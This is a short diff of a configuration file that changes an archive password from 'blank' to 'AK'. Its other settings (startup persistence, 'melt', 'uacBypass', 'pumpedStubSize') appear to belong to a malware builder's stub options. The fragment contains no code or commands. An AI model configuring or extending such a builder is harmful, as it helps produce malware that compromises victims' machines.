@@ -7,7 +7,7 @@
         "startup" : true,
         "melt" : false,
         "uacBypass" : true,
-        "archivePassword" : "blank",
+        "archivePassword" : "AK",
         "consoleMode" : 0,
         "debug" : false,
         "pumpedStubSize" : 0,
